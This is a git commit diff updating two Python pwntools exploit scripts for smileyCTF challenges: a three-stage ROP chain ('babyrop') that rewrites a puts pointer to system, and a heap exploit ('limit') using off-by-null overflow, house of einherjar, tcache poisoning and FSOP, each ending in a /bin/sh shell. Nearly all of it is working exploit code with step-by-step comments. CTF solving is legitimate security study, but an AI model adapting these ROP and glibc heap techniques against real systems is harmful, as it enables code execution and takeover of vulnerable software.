577b1332f5235a036c12451580c717ace17f064d
XinshengZhu <xinsheng.zhu.ny@gmail.com>
2025-07-28 11:23:54 +0800

    Update smileyCTF

--- smileyCTF/babyrop/babyrop.py
+++ smileyCTF/babyrop/babyrop.py
@@ -7,53 +7,54 @@ context.terminal = ['tmux', 'splitw', '-h']
 p = gdb.debug('./vuln_patched', '''
     b *0x40120c
     b *0x40121f
+    b *0x401226
     continue
 ''')
 
 # p = remote('smiley.cat', 42447)
 
 glibc_e = ELF('./libc.so.6')
-LIBC_START_MAIN = 0x40109d # and rsp, 0xfffffffffffffff0; push rax; push rsp; xor r8d, r8d; xor ecx, ecx; mov rdi, 0x4011cf; call qword ptr [rip + 0x2f3b]
-POP_RBP_RET = 0x401181 # pop rbp; ret
-RET = 0x401182 # ret
-MAIN_READ_PUTS = 0x401205 # lea rax, [rbp - 0x20]; mov rdi, rax; call 0x401183; mov rdx, qword ptr [rip + 0x2df8]; lea rax, [rbp - 0x20]; mov rdi, rax; call rdx; mov eax, 0x0; leave; ret
-GADGET_1 = 0x40114c # adc edx, dword ptr [rbp + 0x48]; mov ebp, esp; call 0x4010d0; mov byte ptr [rip + 0x2ec3], 1; pop rbp; ret;
-GADGET_2 = 0x40115c # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
-BSS_FAKE_RBP_ADDR = 0x404000 + 0x1000 # fake saved rbp value 0x405000
-BSS_STACK_PIVOT_ADDR = 0x404000 + 0x800 # stack pivot to 0x404800 always, accommodate the stack frame of multiple function calls later; prevent the rsp from underflowing too much into the non-writable region
-TARGET_ADDR = 0x404010 # target address 0x404010, which the puts() is called from
 
-# Stage 1
-payload1 = b'A' * 0x20
-payload1 += p64(BSS_FAKE_RBP_ADDR) # fake saved rbp value 0x405000
-payload1 += p64(POP_RBP_RET) + p64(BSS_STACK_PIVOT_ADDR) # rbp=0x404800
-payload1 += p64(MAIN_READ_PUTS) # return to 0x401205 in main function: trigger another read() and puts(), puts() is called from 0x404010
+GADGET_1 = 0x401181  # pop rbp; ret;
+GADGET_2 = 0x401182  # ret;
+GADGET_3 = 0x401205  # lea rax, [rbp-0x20]; mov rdi, rax; call 0x401183; mov rdx, qword ptr [rip+0x2df8]; lea rax, [rbp-0x20]; mov rdi, rax; call rdx; mov eax, 0x0; leave; ret; (call *0x404010)
+
+GADGET_4 = 0x40109d  # _start: and rsp, 0xfffffffffffffff0; push rax; push rsp; xor r8d, r8d; xor ecx, ecx; mov rdi, 0x4011cf; call qword ptr [rip+0x2f3b]; (mov rbx, rdx;...call main;)
+GADGET_5 = 0x40114c  # __do_global_dtors_aux: adc edx, dword ptr [rbp+0x48]; mov ebp, esp; call 0x4010d0; mov byte ptr [rip+0x2ec3], 1; pop rbp; ret;
+GADGET_6 = 0x40115c  # __do_global_dtors_aux: add dword ptr [rbp-0x3d], ebx; nop; ret;
+
+ATTACK_TARGET = 0x404010  # a function call is performed in main by call *0x404010 with rbp-0x20 as first argument always
+STACK_PIVOT_TARGET = 0x404800  # stack pivot to 0x404800 always
+FAKE_RBP = 0x405000  # fake rbp value with 0x405000 always
+
+# 1. first ROP: prepare for second ROP and stack pivot to 0x404800
+payload1 = b'A'*0x28  # pad 0x28 bytes
+payload1 += p64(GADGET_1)+p64(STACK_PIVOT_TARGET-8)  # rbp=0x4047f8
+payload1 += p64(GADGET_3)  # call read function in main to read second ROP payload to rbp-0x20=0x4047d8; execute "leave; ret;" instructions in main to stack pivot to 0x404800
 p.send(payload1)
 pause()
 
-# Stage 2
-payload2 = b'B' * 0x18
-payload2 += p64(0x100000000 - (glibc_e.sym['puts'] - glibc_e.sym['system'])) # store the difference -(glibc_puts_addr-glibc_system_addr) in 0x404800-0x20+0x18=0x4047e8 for later use
-payload2 += p64(BSS_FAKE_RBP_ADDR) # fake saved rbp value 0x405000
-payload2 += p64(POP_RBP_RET) + p64(BSS_STACK_PIVOT_ADDR - 0x20 + 0x18 - 0x48) # rbp=0x4047e8-0x48=0x4047a0
-payload2 += p64(GADGET_1) + p64(0) # rbx=*(rbp+0x48)=*0x4047a0=-(glibc_puts_addr-glibc_system_addr)=0x2f490; rbp=0
-payload2 += p64(LIBC_START_MAIN) # trigger main function totally
+# 2. second ROP: put difference of puts and system into appropriate register and prepare for third ROP
+payload2 = b'B'*0x20  # pad 0x20 bytes
+payload2 += p64(0x100000000-(glibc_e.sym.puts-glibc_e.sym.system))  # write difference -(glibc_puts_addr-glibc_system_addr)=-0x2f490=0xfffd0b70 into 0x4047f8
+payload2 += p64(GADGET_1)+p64(STACK_PIVOT_TARGET-8-0x48)  # rbp=0x4047b0
+payload2 += p64(GADGET_5)+p64(0)  # rdx=*(rbp+0x48)=*0x4047f8=-(glibc_puts_addr-glibc_system_addr)=0xfffd0b70; rbp=0
+payload2 += p64(GADGET_4)  # call __libc_start_main function in _start to execute "mov rbx, rdx;" instruction to make rbx=rdx=0xfffd0b70 and totally restart main to read third ROP payload
 p.send(payload2)
 pause()
 
-# Stage 3
-payload3  = b'C' * 0x20
-payload3 += p64(BSS_FAKE_RBP_ADDR) # fake saved rbp value 0x405000
-payload3 += p64(POP_RBP_RET) + p64(TARGET_ADDR + 0x3d) # rbp=0x404010+0x3d=0x40404d
-payload3 += p64(GADGET_2) # *(rbp-0x3d)=*(rbp-0x3d)+rbx: *0x404010=glibc_puts_addr-(glibc_puts_addr-glibc_system_addr)=glibc_system_addr
-payload3 += p64(POP_RBP_RET) + p64(BSS_STACK_PIVOT_ADDR) # rbp=0x404800
-payload3 += p64(RET) # 0x10 bytes stack alignment
-payload3 += p64(MAIN_READ_PUTS) # return to 0x401205 in main function: trigger another read() and puts(), puts() is called from 0x404010, which is system() now
+# 3. third ROP: add difference of puts and system to puts in attack target 0x404010 and prepare for system('/bin/sh\x00')
+payload3  = b'C'*0x28  # pad 0x28 bytes
+payload3 += p64(GADGET_1)+p64(ATTACK_TARGET+0x3d)  # rbp=0x404010+0x3d=0x40404d
+payload3 += p64(GADGET_6)  # *(rbp-0x3d)=*(rbp-0x3d)+rbx=*0x404010+0xfffd0b70=glibc_puts_addr-(glibc_puts_addr-glibc_system_addr)=glibc_system_addr
+payload3 += p64(GADGET_1)+p64(FAKE_RBP)  # rbp=0x405000
+payload3 += p64(GADGET_2)  # align rsp to 0x10 bytes
+payload3 += p64(GADGET_3)  # call read function in main to read '/bin/sh\x00' as first argument for system; call *0x404010 in main to trigger system('/bin/sh\x00')
 p.send(payload3)
 pause()
 
-# Stage 4
-p.send(b'/bin/sh\x00') # trigger system("/bin/sh")
+# 4. trigger system('/bin/sh\x00')
+p.send(b'/bin/sh\x00')  # read in '/bin/sh\x00' to rbp-0x20 and call rbx(rbp-0x20) where rbx=*0x404010=system
 
 p.interactive()
 
--- smileyCTF/limit/limit.py
+++ smileyCTF/limit/limit.py
@@ -15,125 +15,166 @@ p = gdb.debug('./limit_patched', '''
 # p = remote('smiley.cat', 36505)
 
 def malloc(index, size):
-    p.sendlineafter(b"> ", b"1")
+    p.sendlineafter(b"> ", b'1')
     p.sendlineafter(b"Index: ", str(index).encode())
     p.sendlineafter(b"Size: ", str(size).encode())
 
 def free(index):
-    p.sendlineafter(b"> ", b"2")
+    p.sendlineafter(b"> ", b'2')
     p.sendlineafter(b"Index: ", str(index).encode())
 
 def read(index):
-    p.sendlineafter(b"> ", b"3")
+    p.sendlineafter(b"> ", b'3')
     p.sendlineafter(b"Index: ", str(index).encode())
     p.recvuntil(b"Data: ")
     return p.recvuntil(b"\n\n", drop=True)
 
 def write(index, data):
-    p.sendlineafter(b"> ", b"4")
+    p.sendlineafter(b"> ", b'4')
     p.sendlineafter(b"Index: ", str(index).encode())
     p.sendafter(b"Data: ", data)
 
+# every chunk pointer in bss section is set to NULL once freed, whose size value in bss section is set to 0 as well
+# only each malloced chunk with an address less than end of heap area is readable and writable
+# there is no simple use-after-free vulnerability
+# there is an off-by-null overflow when writing data to a chunk
+
 glibc_e = ELF('./libc.so.6')
 
-
-# Stage 1: Leak heap base address and glibc base address
+# Stage 1: leak heap base address and glibc base address
+# allocate 8 chunks of size 0x100
 for i in range(8):
     malloc(i, 0xf8)
+# allocate another chunk of size 0x20 to avoid malloc consolidation
 malloc(8, 0x18)
+# free 8 chunks of size 0x100 to fill tcache bins with first 7 chunks and let last chunk be in unsorted bin
 for i in range(8):
     free(i)
+# allocate 7 chunks of size 0x100 to clear tcache bins
 for i in range(7):
     malloc(i, 0xf8)
 heap_base_addr = ((u64(read(6).ljust(8, b'\x00'))<<12)^0)&~0xfff
 log.info(f"heap base address: {hex(heap_base_addr)}")
+# allocate another chunk of size 0x20, which is splited from chunk of size 0x100 in unsorted bin
 malloc(7, 0x18)
 glibc_base_addr = (u64(read(7).ljust(8, b'\x00'))&~0xfff)-0x203000
 log.info(f"glibc base address: {hex(glibc_base_addr)}")
+# allocate another chunk of size 0xe0 to clear unsorted bin
 malloc(8, 0xd8)
 
-# Stage 2: Leak stack argv address (house of einherjar)
+# Stage 2: house of einherjar for tcache poisoning to leak stack argv address in post tcache poisoning stage
 malloc(0, 0x28)
 malloc(1, 0x28)
 malloc(2, 0x28)
 malloc(3, 0x28)
 malloc(4, 0xf8)
-write(0, p64(0)+p64(0xb0)+p64(heap_base_addr + 0xac0)*2)
+# prepare fake chunk of size 0xb0 at heap_base_addr+0xad0 for house of einherjar in chunk at heap_base_addr+0xac0
+write(0, p64(0)+p64(0xb0)+p64(heap_base_addr+0xac0)*2)
+# overwrite prev_size and size of chunk at heap_base_addr+0xc80 with 0xb0 (fake chunk size) and 0x100 (off-by-null overflow set prev_inuse to 0) respectively to pass check of house of einherjar
 write(3, p64(0)*4+p64(0xb0))
+# allocate 7 chunks of size 0x100
 for i in range(5, 12):
     malloc(i, 0xf8)
+# free 7 chunks of size 0x100 to fill tcache bins
 for i in range(5, 12):
     free(i)
+# free chunk at heap_base_addr+0xc80 to trigger house of einherjar, a chunk of size 0x1b0 (0xb0+0x100) starting from fake chunk at heap_base_addr+0xad0 is freed into unsorted bin
 free(4)
+# prepare for tcache poisoning
 free(2)
 free(1)
+# allocate a chunk of size 0xb0 starting from heap_base_addr+0xad0 to realize writable for freed chunk in tcache bins
 malloc(12, 0xa8)
+# tcache bins with size 0x30: heap_base_addr+0xaf0 <- glibc_base_addr+glibc_e.symbols['__libc_argv'] <- [*(glibc_base_addr+glibc_e.symbols['__libc_argv'])]^((glibc_base_addr+glibc_e.symbols['__libc_argv'])>>12)
 write(12, p64(0)*3+p64(0x31)+p64(((heap_base_addr+0xaf0)>>12)^(glibc_base_addr+glibc_e.symbols['__libc_argv'])))
+# perform tcache poisoning
 malloc(13, 0x28)
 malloc(14, 0x28)
+# tcache bins with size 0x30: heap_base_addr+0xb50 <- [*(glibc_base_addr+glibc_e.symbols['__libc_argv'])]^((glibc_base_addr+glibc_e.symbols['__libc_argv'])>>12)
 free(3)
 malloc(15, 0x28)
 stack_argv_addr = u64(read(15).ljust(8, b'\x00'))^((heap_base_addr+0xb50)>>12)^((glibc_base_addr+glibc_e.symbols['__libc_argv'])>>12)
-log.info(f'stack argv address: {hex(stack_argv_addr)}')
+log.info(f"stack argv address: {hex(stack_argv_addr)}")
+# allocate 8 chunks of size 0xf8 to clear tcache bins
 for i in range(8):
     malloc(i, 0xf8)
 
-# Stage 3: Leak elf start address (house of einherjar)
+# Stage 3: house of einherjar for tcache poisoning to leak elf base address in post tcache poisoning stage
 malloc(0, 0x28)
 malloc(1, 0x28)
 malloc(2, 0x28)
 malloc(3, 0x28)
 malloc(4, 0xf8)
-write(0, p64(0)+p64(0xb0)+p64(heap_base_addr + 0x1380)*2)
+# prepare fake chunk of size 0xb0 at heap_base_addr+0x1390 for house of einherjar in chunk at heap_base_addr+0x1380
+write(0, p64(0)+p64(0xb0)+p64(heap_base_addr+0x1380)*2)
+# overwrite prev_size and size of chunk at heap_base_addr+0x1540 with 0xb0 (fake chunk size) and 0x100 (off-by-null overflow set prev_inuse to 0) respectively to pass check of house of einherjar
 write(3, p64(0)*4+p64(0xb0))
+# allocate 7 chunks of size 0x100
 for i in range(5, 12):
     malloc(i, 0xf8)
+# free 7 chunks of size 0x100 to fill tcache bins
 for i in range(5, 12):
     free(i)
+# free chunk at heap_base_addr+0x1540 to trigger house of einherjar, a chunk of size 0x1b0 (0xb0+0x100) starting from fake chunk at heap_base_addr+0x1390 is freed into unsorted bin
 free(4)
+# prepare for tcache poisoning
 free(2)
 free(1)
+# allocate a chunk of size 0xb0 starting from heap_base_addr+0x1390 to realize writable for freed chunk in tcache bins
 malloc(12, 0xa8)
+# tcache bins with size 0x30: heap_base_addr+0x13b0 <- stack_argv_addr-0x48 <- [*(stack_argv_addr-0x48)]^((stack_argv_addr-0x48)>>12)
 write(12, p64(0)*3+p64(0x31)+p64(((heap_base_addr+0x13b0)>>12)^(stack_argv_addr-0x48)))
+# perform tcache poisoning
 malloc(13, 0x28)
 malloc(14, 0x28)
+# tcache bins with size 0x30: heap_base_addr+0x1410 <- [*(stack_argv_addr-0x48)]^((stack_argv_addr-0x48)>>12)
 free(3)
 malloc(15, 0x28)
-elf_start_addr = u64(read(15).ljust(8, b'\x00'))^((heap_base_addr+0x1410)>>12)^((stack_argv_addr-0x48)>>12)
-log.info(f'elf start address: {hex(elf_start_addr)}')
+elf_base_addr = (u64(read(15).ljust(8, b'\x00'))^((heap_base_addr+0x1410)>>12)^((stack_argv_addr-0x48)>>12))-0x1160
+log.info(f"elf base address: {hex(elf_base_addr)}")
+# allocate 8 chunks of size 0xf8 to clear tcache bins
 for i in range(8):
     malloc(i, 0xf8)
 
-# Stage 4: Modify global variable in bss section (house of einherjar and tcache poisoning)
+# Stage 4: house of einherjar for tcache poisoning to trigger FSOP
 malloc(0, 0x28)
 malloc(1, 0xe8)
 malloc(2, 0xe8)
 malloc(3, 0xf8)
+# prepare fake chunk of size 0x200 at heap_base_addr+0x1c50 for house of einherjar in chunk at heap_base_addr+0x1c40
 write(0, p64(0)+p64(0x200)+p64(heap_base_addr+0x1c40)*2)
+# overwrite prev_size and size of chunk at heap_base_addr+0x1f50 with 0x200 (fake chunk size) and 0x100 (off-by-null overflow set prev_inuse to 0) respectively to pass check of house of einherjar
 write(2, p64(0)*0x1c+p64(0x200))
-free(2)
-free(1)
+# allocate 7 chunks of size 0x100
 for i in range(4, 11):
     malloc(i, 0xf8)
+# free 7 chunks of size 0x100 to fill tcache bins
 for i in range(4, 11):
     free(i)
+# free chunk at heap_base_addr+0x1f50 to trigger house of einherjar, a chunk of size 0x300 (0x200+0x100) starting from fake chunk at heap_base_addr+0x1c50 is freed into unsorted bin
 free(3)
+# prepare for tcache poisoning
+free(2)
+free(1)
+# allocate a chunk of size 0x40 starting from heap_base_addr+0x1c50 to realize writable for freed chunk in tcache bins
 malloc(11, 0x38)
-write(11, p64(0)*3+p64(0xf1)+p64(((heap_base_addr+0x1c70)>>12)^(elf_start_addr+0x2f50)))
+# tcache bins with size 0xf0: heap_base_addr+0x1c70 <- elf_base_addr+0x40b0 (chunks[14])
+write(11, p64(0)*3+p64(0xf1)+p64(((heap_base_addr+0x1c70)>>12)^(elf_base_addr+0x40b0)))
+# perform tcache poisoning
 malloc(12, 0xe8)
 malloc(13, 0xe8)
+# overwrite chunks[14] with glibc stdout address and sizes[14] with 0xff max
 write(13, p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])+p64(0)*4+p64(0x00ff00000000))
-
-# Stage 5: Pop a shell (FSOP)
+# trigger FSOP by exploiting chunks[14]
 fake = FileStructure(0)
 fake.flags = 0x3b01010101010101
-fake._IO_read_end = glibc_base_addr+glibc_e.sym['system']
-fake._IO_save_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10 ; jmp rcx')))
+fake._IO_read_end = glibc_base_addr+glibc_e.sym.system
 fake._IO_write_end = u64(b'/bin/sh\x00')
-fake._lock = glibc_base_addr+glibc_e.sym['_IO_stdfile_1_lock']
-fake._codecvt = glibc_base_addr+glibc_e.sym['_IO_2_1_stdout_']+0xb8
-fake._wide_data = glibc_base_addr+glibc_e.sym['_IO_2_1_stdout_']+0x200
-fake.unknown2=p64(0)*2+p64(glibc_base_addr+glibc_e.sym['_IO_2_1_stdout_']+0x20)+p64(0)*3+p64(glibc_base_addr+glibc_e.sym['_IO_wfile_jumps']-0x18)
+fake._IO_save_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10; jmp rcx;')))
+fake._lock = glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock']
+fake._codecvt = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0xb8
+fake._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x200
+fake.unknown2 = p64(0)*2+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x20)+p64(0)*3+p64(glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']-0x18)
 write(14, bytes(fake))
 
 p.interactive()
